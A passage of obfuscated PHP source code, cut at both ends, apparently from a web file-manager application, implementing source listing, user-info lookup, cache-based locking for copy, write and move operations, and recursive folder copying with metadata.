$Ü¼áÒı = LNG($”¶Ü’Ã…[537]); $™Ç¼×[$”¶Ü’Ã…[538]] = $”¶Ü’Ã…[539]; } if (!$›à°İ˜Œ) { $™Ç¼×[$”¶Ü’Ã…[32]] = $Ü¼áÒı; } } else { $·ŞÙ‰… = Model($”¶Ü’Ã…[513])->getInfoSimple($™Ç¼×[$”¶Ü’Ã…[505]]); $Ü¼áÒı = LNG($”¶Ü’Ã…[540]) . $”¶Ü’Ã…[162] . $·ŞÙ‰…[$”¶Ü’Ã…[32]] . $”¶Ü’Ã…[164]; $™Ç¼×[$”¶Ü’Ã…[541]] = array($”¶Ü’Ã…[32] => $·ŞÙ‰…[$”¶Ü’Ã…[32]], $”¶Ü’Ã…[542] => $·ŞÙ‰…[$”¶Ü’Ã…[542]], $”¶Ü’Ã…[543] => $·ŞÙ‰…[$”¶Ü’Ã…[543]]); } } else { if ($™Ç¼×[$”¶Ü’Ã…[411]] == self::TYPE_GROUP) { $·ŞÙ‰… = Model($”¶Ü’Ã…[522])->getInfoSimple($™Ç¼×[$”¶Ü’Ã…[505]]); $Ü¼áÒı = $·ŞÙ‰…[$”¶Ü’Ã…[32]]; } else { if ($™Ç¼×[$”¶Ü’Ã…[411]] == self::TYPE_SYSTEM) { $Ü¼áÒı = $”¶Ü’Ã…[544]; } } } $Ü¼áÒı = $Ü¼áÒı ? $”¶Ü’Ã…[8] . $Ü¼áÒı . $”¶Ü’Ã…[8] : $”¶Ü’Ã…[8]; return $Ü¼áÒı; } protected function _listAppendUser(&$Í§¡íâ) { $ÆŠåÄ± =& $_SERVER[Ã¶¡¶„æ]; $Ê÷›ª‚… = array_to_keyvalue($Í§¡íâ, $ÆŠåÄ±[12], $ÆŠåÄ±[454]); $úüáˆİŸ = array_to_keyvalue($Í§¡íâ, $ÆŠåÄ±[12], $ÆŠåÄ±[456]); $ß»Ø¦Ó’ = array_merge($Ê÷›ª‚…, $úüáˆİŸ); $šò«¡ãÊ = Model($ÆŠåÄ±[535])->userListInfo($ß»Ø¦Ó’); foreach ($Í§¡íâ as &$ÁçÃ˜µ) { $œ‚—†‰£ = $ÁçÃ˜µ[$ÆŠåÄ±[454]]; $ÁçÃ˜µ[$ÆŠåÄ±[454]] = $šò«¡ãÊ[$œ‚—†‰£] ? $šò«¡ãÊ[$œ‚—†‰£] : !1; $œ‚—†‰£ = $ÁçÃ˜µ[$ÆŠåÄ±[456]]; $ÁçÃ˜µ[$ÆŠåÄ±[456]] = $šò«¡ãÊ[$œ‚—†‰£] ? $šò«¡ãÊ[$œ‚—†‰£] : !1; if (isset($ÁçÃ˜µ[$ÆŠåÄ±[466]]) && $ÁçÃ˜µ[$ÆŠåÄ±[466]][$ÆŠåÄ±[545]]) { $ ­¹×À² = $GLOBALS[$ÆŠåÄ±[6]][$ÆŠåÄ±[89]][$ÆŠåÄ±[546]]; if ($ÁçÃ˜µ[$ÆŠåÄ±[466]][$ÆŠåÄ±[547]] <= time() - $ ­¹×À²) { $this->metaSet($ÁçÃ˜µ[$ÆŠåÄ±[402]], $ÆŠåÄ±[545], null); $this->metaSet($ÁçÃ˜µ[$ÆŠåÄ±[402]], $ÆŠåÄ±[547], null); unset($ÁçÃ˜µ[$ÆŠåÄ±[466]][$ÆŠåÄ±[545]]); continue; } $óŒ”É©§ = $ÁçÃ˜µ[$ÆŠåÄ±[466]][$ÆŠåÄ±[545]]; $ÁçÃ˜µ[$ÆŠåÄ±[466]][$ÆŠåÄ±[548]] = Model($ÆŠåÄ±[535])->getInfoSimpleOuter($óŒ”É©§); } } unset($ÁçÃ˜µ); } public function parentLevelArray($‘’ºŒ™‘) { $äß³€Ö° =& $_SERVER[Ã¶¡¶„æ]; $‘’ºŒ™‘ = explode($äß³€Ö°[50], trim($‘’ºŒ™‘, $äß³€Ö°[50])); return array_remove_value($‘’ºŒ™‘, $äß³€Ö°[197]); } public function listAll($ïƒœßËü) { $›êâúÏú =& $_SERVER[Ã¶¡¶„æ]; $ÓÔïúÕà = $this->sourceInfo($ïƒœßËü); $èÒÀ÷²Ş = array($›êâúÏú[549] => array($›êâúÏú[550], $ÓÔïúÕà[$›êâúÏú[521]] . $ïƒœßËü . $›êâúÏú[551]), $›êâúÏú[552] => 0); $šš°ğ… = $›êâúÏú[553]; $ãÇ‡«ù³ = "\114\x45\x46\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x69\157\137\x66\x69\154\145\40\146\x69\x6c\x65\40\x6f\156\x20\163\157\165\x72\143\145\x2e\146\x69\154\x65\111\x44\40\x3d\40\x66\x69\x6c\x65\x2e\146\151\x6c\145\x49\104"; $Ã–¦â¤ = $this->alias($›êâúÏú[446])->field($šš°ğ…)->where($èÒÀ÷²Ş)->join($ãÇ‡«ù³)->select(); $this->_listAppendAuth($Ã–¦â¤); $this->_listAppendUser($Ã–¦â¤); $this->_listAppendPath($Ã–¦â¤); $Ã–¦â¤ = array_to_keyvalue($Ã–¦â¤, $›êâúÏú[402]); $Ñ³ÏÀì = "\57{$ÓÔïúÕà[$›êâúÏú[32]]}\x2f"; $Ñ³ÏÀì = $Ñ³ÏÀì == $›êâúÏú[529] ? $›êâúÏú[8] : $Ñ³ÏÀì; $ÄÑ¨ıÃè = array(); foreach ($Ã–¦â¤ as $Íé÷Ù¢• => $âíòœ‘ğ) { $±´¢³ä† = $this->parentLevelArray($âíòœ‘ğ[$›êâúÏú[521]]); array_shift($±´¢³ä†); $ƒì©ŸÕ = $Ñ³ÏÀì; for ($‚ûŞ³¸ = 0; $‚ûŞ³¸ < count($±´¢³ä†); $‚ûŞ³¸++) { $ƒì©ŸÕ .= $Ã–¦â¤[$±´¢³ä†[$‚ûŞ³¸]][$›êâúÏú[32]] . $›êâúÏú[8]; } $ƒì©ŸÕ .= $âíòœ‘ğ[$›êâúÏú[32]]; if ($âíòœ‘ğ[$›êâúÏú[410]]) { $ƒì©ŸÕ .= $›êâúÏú[8]; } $ƒì©ŸÕ = str_replace($›êâúÏú[529], $›êâúÏú[8], $ƒì©ŸÕ); $ƒì©ŸÕ = str_replace($›êâúÏú[529], $›êâúÏú[8], $ƒì©ŸÕ); $Ÿ²ÛëÂì = array($›êâúÏú[421] => str_replace($›êâúÏú[529], $›êâúÏú[8], $ƒì©ŸÕ), $›êâúÏú[554] => intval($âíòœ‘ğ[$›êâúÏú[410]]), $›êâúÏú[86] => $this->pathInfoFilter($âíòœ‘ğ)); if (!$âíòœ‘ğ[$›êâúÏú[410]]) { $Ÿ²ÛëÂì[$›êâúÏú[468]] = $âíòœ‘ğ[$›êâúÏú[468]]; $Ÿ²ÛëÂì[$›êâúÏú[87]] = $âíòœ‘ğ[$›êâúÏú[84]]; } $ÄÑ¨ıÃè[] = $Ÿ²ÛëÂì; } return $ÄÑ¨ıÃè; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ç¬™œ°í) { $‚Ÿà¬šÕ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‚Ÿà¬šÕ[555], $Ç¬™œ°í); $û˜Çéü§ = 1; $this->_lockEvent($Ç¬™œ°í, array($‚Ÿà¬šÕ[556], $‚Ÿà¬šÕ[557]), $û˜Çéü§); $this->_lockParent($Ç¬™œ°í, array($‚Ÿà¬šÕ[557]), $û˜Çéü§); $this->_lockEvent($Ç¬™œ°í, array($‚Ÿà¬šÕ[558], $‚Ÿà¬šÕ[559]), $û˜Çéü§); $this->_lockCheckEnd($‚Ÿà¬šÕ[555], $Ç¬™œ°í); } public function lockCopyEnd($¡İ·¥¡¿) { $±ıå‰¾ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->allowLock()) { return; } $íğÉ±î = 0; $this->_lockEvent($¡İ·¥¡¿, array($±ıå‰¾[556], $±ıå‰¾[557]), $íğÉ±î); $this->_lockParent($¡İ·¥¡¿, array($±ıå‰¾[557]), $íğÉ±î); $this->_lockEvent($¡İ·¥¡¿, array($±ıå‰¾[558], $±ıå‰¾[559]), $íğÉ±î); } public function lockWriteStart($…í…êË¯, $İ¡Ì²Ôé = '') { $Áü’±ö =& $_SERVER[Ã¶¡¶„æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Áü’±ö[556], $…í…êË¯); $åÔÖª¨ = 1; $this->_lockKey($Áü’±ö[560] . $…í…êË¯ . $Áü’±ö[10] . $İ¡Ì²Ôé, $åÔÖª¨); $this->_lockEvent($…í…êË¯, array($Áü’±ö[555], $Áü’±ö[557]), $åÔÖª¨); $this->_lockParent($…í…êË¯, array($Áü’±ö[555], $Áü’±ö[557]), $åÔÖª¨); $this->_lockCheckEnd($Áü’±ö[556], $…í…êË¯); } public function lockWriteEnd($Ü©­å®, $ÀÄäÏœæ = '') { $ñÀÚ¹é =& $_SERVER[Ã¶¡¶„æ]; if (!$this->allowLock()) { return; } $¤§Ôú¥¸ = 0; $this->_lockKey($ñÀÚ¹é[560] . $Ü©­å® . $ñÀÚ¹é[10] . $ÀÄäÏœæ, $¤§Ôú¥¸); $this->_lockEvent($Ü©­å®, array($ñÀÚ¹é[555], $ñÀÚ¹é[557]), $¤§Ôú¥¸); $this->_lockParent($Ü©­å®, array($ñÀÚ¹é[555], $ñÀÚ¹é[557]), $¤§Ôú¥¸); } public function lockMoveStart($Îßˆ†») { $˜ÒıÕí =& $_SERVER[Ã¶¡¶„æ]; if (!$this->allowLock()) { return; } $this->_lockCheck($˜ÒıÕí[557], $Îßˆ†»); $Õ“ç‹½¿ = 1; $this->_lockKey($˜ÒıÕí[561] . $Îßˆ†», $Õ“ç‹½¿); $this->_lockEvent($Îßˆ†», array($˜ÒıÕí[555], $˜ÒıÕí[556]), $Õ“ç‹½¿); $this->_lockParent($Îßˆ†», array($˜ÒıÕí[555], $˜ÒıÕí[557]), $Õ“ç‹½¿); $this->_lockEvent($Îßˆ†», array($˜ÒıÕí[562], $˜ÒıÕí[558], $˜ÒıÕí[559]), $Õ“ç‹½¿); $this->_lockCheckEnd($˜ÒıÕí[557], $Îßˆ†»); } public function lockMoveEnd($‚ÑÅĞ¶ˆ) { $›ÄŸ¤­˜ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->allowLock()) { return; } $Ú¥çšû  = 0; $this->_lockKey($›ÄŸ¤­˜[561] . $‚ÑÅĞ¶ˆ, $Ú¥çšû ); $this->_lockEvent($‚ÑÅĞ¶ˆ, array($›ÄŸ¤­˜[555], $›ÄŸ¤­˜[556]), $Ú¥çšû ); $this->_lockParent($‚ÑÅĞ¶ˆ, array($›ÄŸ¤­˜[555], $›ÄŸ¤­˜[557]), $Ú¥çšû ); $this->_lockEvent($‚ÑÅĞ¶ˆ, array($›ÄŸ¤­˜[562], $›ÄŸ¤­˜[558], $›ÄŸ¤­˜[559]), $Ú¥çšû ); } private function _lockCheck($êşší¼è, $ìÕ‰¤œ) { $½µÆ˜ò£ =& $_SERVER[Ã¶¡¶„æ]; $¶”ŸÑ„§ = $this->sourceInfo($ìÕ‰¤œ); $Öâº¤ìö = $êşší¼è . $½µÆ˜ò£[10] . $ìÕ‰¤œ; $this->_lockTimeStart[$Öâº¤ìö] = timeFloat(); if (!is_array($¶”ŸÑ„§)) { return; } $¹ÜöÅ˜‘ = LNG($½µÆ˜ò£[563]); CacheLock::setErrorMsg($½µÆ˜ò£[162] . htmlspecialchars($¶”ŸÑ„§[$½µÆ˜ò£[32]]) . $½µÆ˜ò£[164] . $¹ÜöÅ˜‘); $this->_lockKey($Öâº¤ìö, 1); $this->_lockKey($Öâº¤ìö, 0); $Ë¹Ù…Ø„ = array_reverse($this->parentLevelArray($¶”ŸÑ„§[$½µÆ˜ò£[521]])); foreach ($Ë¹Ù…Ø„ as $îˆç›‹Ò) { $Öâº¤ìö = $êşší¼è . $½µÆ˜ò£[564] . $îˆç›‹Ò; if (CacheLock::lockGet($½µÆ˜ò£[565] . $Öâº¤ìö)) { $¶”ŸÑ„§ = $this->sourceInfo($îˆç›‹Ò); CacheLock::setErrorMsg($½µÆ˜ò£[162] . htmlspecialchars($¶”ŸÑ„§[$½µÆ˜ò£[32]]) . $½µÆ˜ò£[164] . $¹ÜöÅ˜‘); $this->_lockKey($Öâº¤ìö, 1); $this->_lockKey($Öâº¤ìö, 0); } } } private function _lockCheckEnd($•€æÊˆ, $°ËŒ›ë¨) { $‘ß»ã¾í =& $_SERVER[Ã¶¡¶„æ]; $ü—Š‚Æ· = $•€æÊˆ . $‘ß»ã¾í[10] . $°ËŒ›ë¨; CacheLock::setErrorMsg($‘ß»ã¾í[378]); if (!isset($this->_lockTimeStart[$ü—Š‚Æ·])) { return; } $€™°ñ»” = timeFloat() - $this->_lockTimeStart[$ü—Š‚Æ·]; unset($this->_lockTimeStart[$ü—Š‚Æ·]); if ($€™°ñ»” > 0.5) { unset(self::$cacheSourceInfo[$‘ß»ã¾í[460] . $°ËŒ›ë¨]); } $¡±ÈŸ¸« = $this->sourceInfo($°ËŒ›ë¨); if (!$¡±ÈŸ¸«) { show_json(LNG($‘ß»ã¾í[105]), !1); } } private function _lockParent($ÆÉ÷Óİ, $­”Œ¡íå, $Ï®œš) { if (!$this->autoLockSet) { return; } $Ïñ«Ó† = $this->sourceInfo($ÆÉ÷Óİ); if (!is_array($Ïñ«Ó†)) { return; } $ÔÁÎÎäç = array_reverse($this->parentLevelArray($Ïñ«Ó†[$_SERVER[Ã¶¡¶„æ][521]])); foreach ($ÔÁÎÎäç as $¿ß¦‚Å¡) { $this->_lockEvent($¿ß¦‚Å¡, $­”Œ¡íå, $Ï®œš); } } private function _lockEvent($¿ÑŠşíë, $ìê¸ñŠÒ, $Éœ‹¥‰) { $ƒß‰Õ¢ı =& $_SERVER[Ã¶¡¶„æ]; if (!$this->autoLockSet) { return; } foreach ($ìê¸ñŠÒ as $úÑÊÇßë) { $† ˜¸¦× = $úÑÊÇßë . $ƒß‰Õ¢ı[10] . $¿ÑŠşíë; if ($Éœ‹¥‰ && CacheLock::lockGet($ƒß‰Õ¢ı[565] . $† ˜¸¦×)) { continue; } $this->_lockKey($† ˜¸¦×, $Éœ‹¥‰); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Õ¯òÊßÈ, $îÚÜÉê¶ = 1) { $æšÚæöú = $_SERVER[Ã¶¡¶„æ][565] . md5($Õ¯òÊßÈ); if ($îÚÜÉê¶) { if (isset(self::$_lockItemArr[$æšÚæöú])) { return; } self::$_lockItemArr[$æšÚæöú] = 1; CacheLock::lock($æšÚæöú, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$æšÚæöú])) { return; } unset(self::$_lockItemArr[$æšÚæöú]); CacheLock::unlock($æšÚæöú); } } public function isParentOf($êÄĞ®³í, $ŠÃÔœÜ¶) { $‹™ıì†õ =& $_SERVER[Ã¶¡¶„æ]; $„ÂÛˆÜ£ = $this->sourceInfo($êÄĞ®³í); $œÈ§•¤Ç = $this->sourceInfo($ŠÃÔœÜ¶); $æıÕÃÎñ = $„ÂÛˆÜ£[$‹™ıì†õ[521]] . $„ÂÛˆÜ£[$‹™ıì†õ[402]] . $‹™ıì†õ[50]; $åµäöéâ = $œÈ§•¤Ç[$‹™ıì†õ[521]] . $œÈ§•¤Ç[$‹™ıì†õ[402]] . $‹™ıì†õ[50]; $×ø“´ñğ = strpos($åµäöéâ, $æıÕÃÎñ) === 0; return $×ø“´ñğ; } private $targetIsDelete = 0; public function copy($Ó«‘‹’Ê, $œù–‘´, $Ñ´¶Æúê = REPEAT_REPLACE, $˜ÙìöÄ… = '') { $¢¤ÓœÕ =& $_SERVER[Ã¶¡¶„æ]; $àë Ëº¬ = $this->sourceInfo($Ó«‘‹’Ê); $şƒ¦ñ = $this->sourceInfo($œù–‘´); if (!$àë Ëº¬ || !$şƒ¦ñ || $şƒ¦ñ[$¢¤ÓœÕ[410]] != $¢¤ÓœÕ[88]) { return !1; } if ($this->isParentOf($Ó«‘‹’Ê, $œù–‘´)) { return !1; } $Ç•Ñ•Ğ½ = $˜ÙìöÄ… ? $˜ÙìöÄ… : $àë Ëº¬[$¢¤ÓœÕ[32]]; $this->lockCopyStart($Ó«‘‹’Ê); $this->lockWriteStart($œù–‘´, $Ç•Ñ•Ğ½); $æÄÑöÁ¢ = array($¢¤ÓœÕ[566] => array(), $¢¤ÓœÕ[567] => array(), $¢¤ÓœÕ[568] => array()); $this->targetIsDelete = intval($àë Ëº¬[$¢¤ÓœÕ[431]]); $†¨Ë = $this->fileNameExistCache($œù–‘´, $àë Ëº¬[$¢¤ÓœÕ[32]]); $ëíÇ¦Ù  = $this->_copy($Ó«‘‹’Ê, $œù–‘´, $Ñ´¶Æúê, $æÄÑöÁ¢, !0, $˜ÙìöÄ…); $this->_childrenListClear(); $this->lockCopyEnd($Ó«‘‹’Ê); $this->lockWriteEnd($œù–‘´, $Ç•Ñ•Ğ½); if ($àë Ëº¬[$¢¤ÓœÕ[410]] == $¢¤ÓœÕ[88] && $†¨Ë == $ëíÇ¦Ù ) { $this->folderSizeResetChildren($†¨Ë); } Model($¢¤ÓœÕ[569])->addAll($æÄÑöÁ¢[$¢¤ÓœÕ[567]], array(), !0); if ($†¨Ë != $ëíÇ¦Ù  || $àë Ëº¬[$¢¤ÓœÕ[410]] == $¢¤ÓœÕ[88]) { Model($¢¤ÓœÕ[570])->eventCopy($ëíÇ¦Ù ); } $this->saveAll($æÄÑöÁ¢[$¢¤ÓœÕ[568]]); Model($¢¤ÓœÕ[199])->linkAdd($æÄÑöÁ¢[$¢¤ÓœÕ[566]]); $this->folderSizeReset($œù–‘´); $this->updateModifyTime($œù–‘´); return $ëíÇ¦Ù ; } private function _copy($ì§Ù€ô, $»èü¾Ïğ, $ãßÌÎ¨†, &$©¶À‚ú, $‹Ûµ¿‚ô, $øîğ€Ë = '') { $¡ì·¼´® =& $_SERVER[Ã¶¡¶„æ]; $Ãš­ùŞ¸ = $this->sourceInfoCache($ì§Ù€ô); $¨Ìéëª = $Ãš­ùŞ¸[$¡ì·¼´®[410]] == $¡ì·¼´®[88]; $ãú¼³ûï = $øîğ€Ë ? $øîğ€Ë : $Ãš­ùŞ¸[$¡ì·¼´®[32]]; $¡ô§·Ó = $this->fileNameExistCache($»èü¾Ïğ, $ãú¼³ûï); if ($‹Ûµ¿‚ô) { $this->_childrenAllMake($ì§Ù€ô); if ($¨Ìéëª && $¡ô§·Ó) { $this->_childrenAllMake($¡ô§·Ó); } } if (!$¡ô§·Ó) { return $this->_copyCreate($ì§Ù€ô, $»èü¾Ïğ, $ãú¼³ûï, $©¶À‚ú); } $ÜËÈééÈ = $¡ô§·Ó; if ($¨Ìéëª) { if ($ãßÌÎ¨† == REPEAT_RENAME_FOLDER) { $ãú¼³ûï = $this->fileNameAutoCache($»èü¾Ïğ, $ãú¼³ûï, $ãßÌÎ¨†, $¨Ìéëª); $ÜËÈééÈ = $this->_copyCreate($ì§Ù€ô, $»èü¾Ïğ, $ãú¼³ûï, $©¶À‚ú); } else { $—ÄÕ»€¤ = $this->_childrenList($ì§Ù€ô); foreach ($—ÄÕ»€¤ as $áˆãÖëÇ) { $this->_copy($áˆãÖëÇ[$¡ì·¼´®[402]], $¡ô§·Ó, $ãßÌÎ¨†, $©¶À‚ú, !1); } } } else { if ($ãßÌÎ¨† == REPEAT_RENAME || $ãßÌÎ¨† == REPEAT_RENAME_FOLDER) { $ãú¼³ûï = $this->fileNameAutoCache($»èü¾Ïğ, $ãú¼³ûï, $ãßÌÎ¨†, $¨Ìéëª); $ÜËÈééÈ = $this->_copyCreate($ì§Ù€ô, $»èü¾Ïğ, $ãú¼³ûï, $©¶À‚ú); } else { if ($ãßÌÎ¨† == REPEAT_REPLACE) { $¤µÂâõÃ = $this->sourceInfoCache($¡ô§·Ó); $àºÌ€›™ = $this->fileHistory($¤µÂâõÃ, $Ãš­ùŞ¸[$¡ì·¼´®[468]], $Ãš­ùŞ¸[$¡ì·¼´®[76]]); if ($àºÌ€›™) { $©¶À‚ú[$¡ì·¼´®[566]][] = $Ãš­ùŞ¸[$¡ì·¼´®[468]]; } } else { if ($ãßÌÎ¨† == REPEAT_SKIP) { } } } Hook::trigger($¡ì·¼´®[571], array($¡ì·¼´®[572], $Ãš­ùŞ¸, 0)); } return $ÜËÈééÈ; } private function _copyCreate($ìÇß€ÄÖ, $ò¾¤“Êñ, $ ·Â”ÄŞ, &$›»ğØÉ«) { $Á¬Ó¤‰ç =& $_SERVER[Ã¶¡¶„æ]; $›ÜŠ¹Ÿ÷ = $this->sourceInfoCache($ìÇß€ÄÖ); $ñ”Ùä¨£ = $this->sourceInfoCache($ò¾¤“Êñ); $ó¡áµ‚´ = $this->_makeItemData($›ÜŠ¹Ÿ÷, $ñ”Ùä¨£, $ ·Â”ÄŞ); Hook::trigger($Á¬Ó¤‰ç[573], $ó¡áµ‚´); Hook::trigger($Á¬Ó¤‰ç[574], array($Á¬Ó¤‰ç[575], $ó¡áµ‚´, 0)); $ˆÏ˜’Û“ = $this->add($ó¡áµ‚´); $‘×á¥¬— = array($Á¬Ó¤‰ç[402] => $ˆÏ˜’Û“, $Á¬Ó¤‰ç[32] => $ ·Â”ÄŞ); $this->_copyApplyMeta($‘×á¥¬—, $›»ğØÉ«); if ($›ÜŠ¹Ÿ÷[$Á¬Ó¤‰ç[410]] != $Á¬Ó¤‰ç[88]) { $›»ğØÉ«[$Á¬Ó¤‰ç[566]][] = $›ÜŠ¹Ÿ÷[$Á¬Ó¤‰ç[468]]; return $ˆÏ˜’Û“; } $ğ˜±…‰˜ = array(); $ß„€·ÚÜ = array(); $this->_childrenListAll($ìÇß€ÄÖ, $ğ˜±…‰˜); $ÍıĞ®‚³ = count($ğ˜±…‰˜); if ($ÍıĞ®‚³ == 0) { return $ˆÏ˜’Û“; } $¯´Ö½ô = $this->sourceInfo($ˆÏ˜’Û“); foreach ($ğ˜±…‰˜ as $¾ÌĞ÷ßğ) { $ßÅèİÓ… = $this->_makeItemData($¾ÌĞ÷ßğ, $¯´Ö½ô, $¾ÌĞ÷ßğ[$Á¬Ó¤‰ç[32]]); $ßÅèİÓ…[$Á¬Ó¤‰ç[521]] = $¾ÌĞ÷ßğ[$Á¬Ó¤‰ç[521]]; $ß„€·ÚÜ[] = $ßÅèİÓ…; } $this->chunkEventSet($Á¬Ó¤‰ç[576], array($Á¬Ó¤‰ç[577], $ó¡áµ‚´, $ÍıĞ®‚³)); $this->addAll($ß„€·ÚÜ, array(), !1); $·‚•ôºÇ = $this->where(array($Á¬Ó¤‰ç[432] => $ˆÏ˜’Û“))->select(); $ÎÎáÙƒí = $this->_childrenMakeRelation($ğ˜±…‰˜, $·‚•ôºÇ); $ÎÎáÙƒí[$ìÇß€ÄÖ] = $ˆÏ˜’Û“; $¯ŞÑö×Û = array(); $ŞÙº†µ = array(); foreach ($·‚•ôºÇ as $¾ÌĞ÷ßğ) { $ŒÊ¤óŞí = $¾ÌĞ÷ßğ[$Á¬Ó¤‰ç[402]]; $æìÈ¤á‘ = $this->_childrenMatch($ÎÎáÙƒí, $¾ÌĞ÷ßğ, $¯´Ö½ô); $¯ŞÑö×Û[] = array($Á¬Ó¤‰ç[402], $ŒÊ¤óŞí, $Á¬Ó¤‰ç[432], $æìÈ¤á‘[$Á¬Ó¤‰ç[432]]); $ŞÙº†µ[] = array($Á¬Ó¤‰ç[402], $ŒÊ¤óŞí, $Á¬Ó¤‰ç[521], $æìÈ¤á‘[$Á¬Ó¤‰ç[521]]); $this->_copyApplyMeta($¾ÌĞ÷ßğ, $›»ğØÉ«); if ($¾ÌĞ÷ßğ[$Á¬Ó¤‰ç[410]] != $Á¬Ó¤‰ç[88]) { $›»ğØÉ«[$Á¬Ó¤‰ç[566]][] = $¾ÌĞ÷ßğ[$Á¬Ó¤‰ç[468]]; } } $this->chunkEventSet($Á¬Ó¤‰ç[578], array($Á¬Ó¤‰ç[579], $ó¡áµ‚´, $ÍıĞ®‚³)); $this->saveAll($¯ŞÑö×Û); $this->chunkEventSet($Á¬Ó¤‰ç[580], array($Á¬Ó¤‰ç[581], $ó¡áµ‚´, $ÍıĞ®‚³)); $this->saveAll($ŞÙº†µ); return $ˆÏ˜’Û“; } private function _childrenMakeRelation($¦¥ŸÒ×³, $©¬¯§‚©) { $Ì‡•Àòé =& $_SERVER[Ã¶¡¶„æ]; $Í¤÷¥§ = array(); $›õÒªïù = array(); foreach ($¦¥ŸÒ×³ as $Â‚Ò¾ûâ) { $©ËœÓŒ™ = $Â‚Ò¾ûâ[$Ì‡•Àòé[32]] . $Ì‡•Àòé[8] . $Â‚Ò¾ûâ[$Ì‡•Àòé[521]]; $Í¤÷¥§[$©ËœÓŒ™] = $Â‚Ò¾ûâ[$Ì‡•Àòé[402]]; } foreach ($©¬¯§‚© as $Â‚Ò¾ûâ) { $©ËœÓŒ™ = $Â‚Ò¾ûâ[$Ì‡•Àòé[32]] . $Ì‡•Àòé[8] . $Â‚Ò¾ûâ[$Ì‡•Àòé[521]]; $£Ÿ¨ÂĞ = $Í¤÷¥§[$©ËœÓŒ™]; $›õÒªïù[$£Ÿ¨ÂĞ] = $Â‚Ò¾ûâ[$Ì‡•Àòé[402]]; } return $›õÒªïù; } private function _childrenMatch($™äşáÉõ, $§å’Îà, $«Òü›òÊ) { $‚ÍıÃï =& $_SERVER[Ã¶¡¶„æ]; $â…Û´ò¿ = $«Òü›òÊ[$‚ÍıÃï[521]]; $ÃêÏıÙ´ = $this->parentLevelArray($§å’Îà[$‚ÍıÃï[521]]); foreach ($ÃêÏıÙ´ as $Ü÷…ÉÄ) { if (isset($™äşáÉõ[$Ü÷…ÉÄ])) { $â…Û´ò¿ .= $™äşáÉõ[$Ü÷…ÉÄ] . $‚ÍıÃï[582]; } } $â…Û´ò¿ = rtrim($â…Û´ò¿, $‚ÍıÃï[50]) . $‚ÍıÃï[50]; $ßş¹€Ñ­ = $this->parentLevelArray($â…Û´ò¿); $§Öİ«¬ñ = $ßş¹€Ñ­[count($ßş¹€Ñ­) - 1]; return array($‚ÍıÃï[432] => $§Öİ«¬ñ, $‚ÍıÃï[521] => $â…Û´ò¿); } private function _makeItemData($’²š’Ãã, $·ÌÙâœ€, $šÚ¸ŒôÜ) { $ŸğŸ÷¶¹ =& $_SERVER[Ã¶¡¶„æ]; $å‡†è© = array($ŸğŸ÷¶¹[583] => $’²š’Ãã[$ŸğŸ÷¶¹[410]], $ŸğŸ÷¶¹[420] => $šÚ¸ŒôÜ, $ŸğŸ÷¶¹[584] => $’²š’Ãã[$ŸğŸ÷¶¹[412]] ? $’²š’Ãã[$ŸğŸ÷¶¹[412]] : $ŸğŸ÷¶¹[12], $ŸğŸ÷¶¹[469] => $’²š’Ãã[$ŸğŸ÷¶¹[468]] ? $’²š’Ãã[$ŸğŸ÷¶¹[468]] : 0, $ŸğŸ÷¶¹[585] => $’²š’Ãã[$ŸğŸ÷¶¹[76]] ? $’²š’Ãã[$ŸğŸ÷¶¹[76]] : 0, $ŸğŸ÷¶¹[586] => intval($·ÌÙâœ€[$ŸğŸ÷¶¹[411]]), $ŸğŸ÷¶¹[587] => intval($·ÌÙâœ€[$ŸğŸ÷¶¹[505]]), $ŸğŸ÷¶¹[588] => intval(USER_ID), $ŸğŸ÷¶¹[589] => intval(USER_ID), $ŸğŸ÷¶¹[401] => intval($·ÌÙâœ€[$ŸğŸ÷¶¹[402]]), $ŸğŸ÷¶¹[590] => $·ÌÙâœ€[$ŸğŸ÷¶¹[521]] . $·ÌÙâœ€[$ŸğŸ÷¶¹[402]] . $ŸğŸ÷¶¹[50], $ŸğŸ÷¶¹[424] => $’²š’Ãã[$ŸğŸ÷¶¹[85]] ? $’²š’Ãã[$ŸğŸ÷¶¹[85]] : time(), $ŸğŸ÷¶¹[430] => 0, $ŸğŸ÷¶¹[591] => $ŸğŸ÷¶¹[12]); return $å‡†è©; } private function _copyApplyMeta($É±¢áÉº, &$‹¿ó¶) { $Æï„®“ª =& $_SERVER[Ã¶¡¶„æ]; $°ƒëƒğø = $É±¢áÉº[$Æï„®“ª[402]]; $Éß‚îş¢ = $É±¢áÉº[$Æï„®“ª[32]]; if (!isset($É±¢áÉº[$Æï„®“ª[592]]) || !$É±¢áÉº[$Æï„®“ª[592]] || $É±¢áÉº[$Æï„®“ª[592]] == $Æï„®“ª[197]) { $‹¿ó¶[$Æï„®“ª[568]][] = array($Æï„®“ª[402], $°ƒëƒğø, $Æï„®“ª[592], short_id($°ƒëƒğø)); } if (Input::check($Éß‚îş¢, $Æï„®“ª[593])) { $‹¿ó¶[$Æï„®“ª[567]][] = array($Æï„®“ª[402] => $°ƒëƒğø, $Æï„®“ª[94] => $Æï„®“ª[465], $Æï„®“ª[374] => str_replace($Æï„®“ª[53], $Æï„®“ª[12], Pinyin::get($Éß‚îş¢))); $‹¿ó¶[$Æï„®“ª[567]][] = array($Æï„®“ª[402] => $°ƒëƒğø, $Æï„®“ª[94] => $Æï„®“ª[464], $Æï„®“ª[374] => Pinyin::get($Éß‚îş¢, $Æï„®“ª[594])); } $‹¿ó¶[$Æï„®“ª[567]][] = array($Æï„®“ª[402] => $°ƒëƒğø, $Æï„®“ª[94] => $Æï„®“ª[444], $Æï„®“ª[374] => KodSort::makeStr($Éß‚îş¢)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($š›°Ì…‹) { $‹×Êß =& $_SERVER[Ã¶¡¶„æ]; $£òïê¯² = $this->sourceInfo($š›°Ì…‹); $Ê»Íö = $‹×Êß[595]; $•óéŸİİ = array($‹×Êß[521] => array($‹×Êß[550], $£òïê¯²[$‹×Êß[521]] . $š›°Ì…‹ . $‹×Êß[551]), $‹×Êß[431] => 